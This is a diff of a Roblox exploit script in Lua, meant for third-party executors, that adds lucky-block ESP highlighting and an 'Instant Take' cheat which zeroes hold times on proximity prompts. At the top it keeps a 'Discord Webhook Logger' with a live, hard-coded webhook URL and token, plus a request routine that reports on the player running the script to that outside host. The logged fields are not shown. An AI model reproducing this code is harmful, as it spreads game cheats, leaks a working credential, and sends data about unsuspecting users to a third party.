@@ -1,9 +1,13 @@
---// Discord Webhook Logger
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1466552183444078706/KK4pLVoGu0K_NQPy8-0I47-pQvKTr27zMP-1-3LNYbhdN3Yr288aFXROAsMljtRFevgK"
+--// Discord Webhook Logger + Lucky Blocks ESP + Rare + Celestial + Refresh + Instant Take
+local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
-local player = Players.LocalPlayer
+
+-- Discord Logger
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1466552183444078706/KK4pLVoGu0K_NQPy8-0I47-pQvKTr27zMP-1-3LNYbhdN3Yr288aFXROAsMljtRFevgK"
 local req = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
 
 if req then
@@ -34,11 +38,7 @@ if req then
     end)
 end
 
-local TweenService = game:GetService("TweenService")
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local workspace = game:GetService("Workspace")
-
+-- GUI
 local gui = Instance.new("ScreenGui")
 gui.Name = "FaisalUI"
 gui.ResetOnSpawn = false
@@ -48,19 +48,20 @@ local topHeight = 26
 local buttonHeight = 28
 local padding = 6
 
+-- ترتيب الأزرار + ألوان مخصصة + Rare + Celestial
 local orderedBlocks = {
-	{name = "common lucky block", model = "NaturalLuckyBlock_Common", color = Color3.fromRGB(200,200,200)},
-	{name = "uncommon lucky block", model = "NaturalLuckyBlock_Uncommon", color = Color3.fromRGB(0,255,0)},
-	{name = "rare lucky block", model = "NaturalLuckyBlock_Rare", color = Color3.fromRGB(0,150,255)},
-	{name = "epic lucky block", model = "NaturalLuckyBlock_Epic", color = Color3.fromRGB(128,0,128)},
-	{name = "legendary lucky block", model = "NaturalLuckyBlock_Legendary", color = Color3.fromRGB(255,255,0)},
-	{name = "mythical lucky block", model = "NaturalLuckyBlock_Mythical", color = Color3.fromRGB(255,215,0)},
-	{name = "cosmic lucky block", model = "NaturalLuckyBlock_Cosmic", color = Color3.fromRGB(0,0,0)},
-	{name = "secret lucky block", model = "NaturalLuckyBlock_Secret", color = Color3.fromRGB(255,0,0)},
-	{name = "celestial lucky block", model = "EventLuckyBlock_Celestial", color = Color3.fromRGB(0,200,255)}
+    {name = "common lucky block", model = "NaturalLuckyBlock_Common", color = Color3.fromRGB(200,200,200)},
+    {name = "uncommon lucky block", model = "NaturalLuckyBlock_Uncommon", color = Color3.fromRGB(0,255,0)},
+    {name = "rare lucky block", model = "NaturalLuckyBlock_Rare", color = Color3.fromRGB(0,150,255)},
+    {name = "epic lucky block", model = "NaturalLuckyBlock_Epic", color = Color3.fromRGB(128,0,128)},
+    {name = "legendary lucky block", model = "NaturalLuckyBlock_Legendary", color = Color3.fromRGB(255,255,0)},
+    {name = "mythical lucky block", model = "NaturalLuckyBlock_Mythical", color = Color3.fromRGB(255,215,0)},
+    {name = "cosmic lucky block", model = "NaturalLuckyBlock_Cosmic", color = Color3.fromRGB(0,0,0)},
+    {name = "secret lucky block", model = "NaturalLuckyBlock_Secret", color = Color3.fromRGB(255,0,0)},
+    {name = "celestial lucky block", model = "EventLuckyBlock_Celestial", color = Color3.fromRGB(0,200,255)}
 }
 
-local totalButtons = #orderedBlocks + 1
+local totalButtons = #orderedBlocks + 2 -- + Refresh + Instant Take
 local mainHeight = topHeight + totalButtons*(buttonHeight + padding)
 
 local main = Instance.new("Frame")
@@ -73,6 +74,7 @@ main.Active = true
 main.Draggable = true
 Instance.new("UICorner", main).CornerRadius = UDim.new(0,10)
 
+-- Top Bar
 local top = Instance.new("Frame", main)
 top.Size = UDim2.new(1,0,0,topHeight)
 top.BackgroundColor3 = Color3.fromRGB(25,25,25)
@@ -97,9 +99,10 @@ arrow.Font = Enum.Font.GothamBold
 arrow.TextColor3 = Color3.fromRGB(220,220,220)
 arrow.BackgroundTransparency = 1
 
+-- Content
 local content = Instance.new("Frame", main)
 content.Position = UDim2.new(0,0,0,topHeight)
-content.Size = UDim2.new(1,0,1, -topHeight)
+content.Size = UDim2.new(1,0,1,-topHeight)
 content.BackgroundTransparency = 1
 
 local layout = Instance.new("UIListLayout", content)
@@ -107,93 +110,133 @@ layout.Padding = UDim.new(0,padding)
 layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 layout.VerticalAlignment = Enum.VerticalAlignment.Top
 
+-- Toggle
 local opened = true
 local openSize = main.Size
 local closeSize = UDim2.fromOffset(180,topHeight)
 
 arrow.MouseButton1Click:Connect(function()
-	opened = not opened
-	arrow.Text = opened and "▼" or "▲"
-	content.Visible = opened
-	TweenService:Create(main,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
-		{Size = opened and openSize or closeSize}):Play()
+    opened = not opened
+    arrow.Text = opened and "▼" or "▲"
+    content.Visible = opened
+    TweenService:Create(main,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
+        {Size = opened and openSize or closeSize}):Play()
 end)
 
+-- Highlight Models
 local highlightedModels = {}
 for _, block in ipairs(orderedBlocks) do
-	highlightedModels[block.model] = {}
+    highlightedModels[block.model] = {}
 end
 
 local function highlightModel(model, color, isRainbow)
-	if highlightedModels[model.Name][model] then return end
-	highlightedModels[model.Name][model] = true
+    if highlightedModels[model.Name][model] then return end
+    highlightedModels[model.Name][model] = true
 
-	for _, part in pairs(model:GetDescendants()) do
-		if part:IsA("BasePart") then
-			for _, child in pairs(part:GetChildren()) do
-				if child:IsA("BoxHandleAdornment") then
-					child:Destroy()
-				end
-			end
+    for _, part in pairs(model:GetDescendants()) do
+        if part:IsA("BasePart") then
+            for _, child in pairs(part:GetChildren()) do
+                if child:IsA("BoxHandleAdornment") then
+                    child:Destroy()
+                end
+            end
 
-			local adorn = Instance.new("BoxHandleAdornment")
-			adorn.Adornee = part
-			adorn.AlwaysOnTop = true
-			adorn.ZIndex = 10
-			adorn.Size = part.Size
-			adorn.Transparency = 0.3
-			adorn.Parent = part
+            local adorn = Instance.new("BoxHandleAdornment")
+            adorn.Adornee = part
+            adorn.AlwaysOnTop = true
+            adorn.ZIndex = 10
+            adorn.Size = part.Size
+            adorn.Transparency = 0.3
+            adorn.Parent = part
 
-			if isRainbow then
-				task.spawn(function()
-					while adorn.Parent do
-						local t = tick()
-						adorn.Color3 = Color3.fromHSV(t % 1, 1, 1)
-						task.wait(0.1)
-					end
-				end)
-			else
-				adorn.Color3 = color
-			end
-		end
-	end
+            if isRainbow then
+                task.spawn(function()
+                    while adorn.Parent do
+                        adorn.Color3 = Color3.fromHSV(tick() % 1,1,1)
+                        task.wait(0.1)
+                    end
+                end)
+            else
+                adorn.Color3 = color
+            end
+        end
+    end
 end
 
+-- Refresh Function
 local function refreshAll()
-	for _, block in ipairs(orderedBlocks) do
-		local isRainbow = (block.name == "celestial lucky block")
-		for _, obj in pairs(workspace:GetDescendants()) do
-			if obj:IsA("Model") and obj.Name == block.model then
-				highlightModel(obj, block.color, isRainbow)
-			end
-		end
-	end
-	print("All Lucky Blocks refreshed!")
+    for _, block in ipairs(orderedBlocks) do
+        local isRainbow = (block.name == "celestial lucky block")
+        for _, obj in pairs(workspace:GetDescendants()) do
+            if obj:IsA("Model") and obj.Name == block.model then
+                highlightModel(obj, block.color, isRainbow)
+            end
+        end
+    end
+    print("All Lucky Blocks refreshed!")
 end
 
+-- Instant Take Function
+local function setPromptInstant(prompt)
+    if prompt:IsA("ProximityPrompt") then
+        pcall(function()
+            prompt.HoldDuration = 0
+        end)
+    end
+end
+
+for _, v in ipairs(workspace:GetDescendants()) do
+    setPromptInstant(v)
+end
+
+workspace.DescendantAdded:Connect(function(v)
+    setPromptInstant(v)
+end)
+
+-- Create Buttons
 for _, block in ipairs(orderedBlocks) do
-	local btn = Instance.new("TextButton")
-	btn.Parent = content
-	btn.Size = UDim2.new(1,-12,0,buttonHeight)
-	btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
-	btn.Text = block.name
-	btn.TextColor3 = Color3.fromRGB(230,230,230)
-	btn.TextSize = 11
-	btn.Font = Enum.Font.Gotham
-	btn.BorderSizePixel = 0
-	Instance.new("UICorner", btn).CornerRadius = UDim.new(0,6)
+    local btn = Instance.new("TextButton")
+    btn.Parent = content
+    btn.Size = UDim2.new(1,-12,0,buttonHeight)
+    btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    btn.Text = block.name
+    btn.TextColor3 = Color3.fromRGB(230,230,230)
+    btn.TextSize = 11
+    btn.Font = Enum.Font.Gotham
+    btn.BorderSizePixel = 0
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,6)
 
-	btn.MouseButton1Click:Connect(function()
-		local isRainbow = (block.name == "celestial lucky block")
-		for _, obj in pairs(workspace:GetDescendants()) do
-			if obj:IsA("Model") and obj.Name == block.model then
-				highlightModel(obj, block.color, isRainbow)
-			end
-		end
-		print(block.name .. " highlighted!")
-	end)
+    btn.MouseButton1Click:Connect(function()
+        local isRainbow = (block.name == "celestial lucky block")
+        for _, obj in pairs(workspace:GetDescendants()) do
+            if obj:IsA("Model") and obj.Name == block.model then
+                highlightModel(obj, block.color, isRainbow)
+            end
+        end
+        print(block.name .. " highlighted!")
+    end)
 end
 
+-- زر Instant Take
+local instantBtn = Instance.new("TextButton")
+instantBtn.Parent = content
+instantBtn.Size = UDim2.new(1,-12,0,buttonHeight)
+instantBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
+instantBtn.Text = "Instant Take"
+instantBtn.TextColor3 = Color3.fromRGB(230,230,230)
+instantBtn.TextSize = 11
+instantBtn.Font = Enum.Font.GothamBold
+instantBtn.BorderSizePixel = 0
+Instance.new("UICorner", instantBtn).CornerRadius = UDim.new(0,6)
+
+instantBtn.MouseButton1Click:Connect(function()
+    for _, v in ipairs(workspace:GetDescendants()) do
+        setPromptInstant(v)
+    end
+    print("Instant Take applied!")
+end)
+
+-- زر Refresh
 local refreshBtn = Instance.new("TextButton")
 refreshBtn.Parent = content
 refreshBtn.Size = UDim2.new(1,-12,0,buttonHeight)
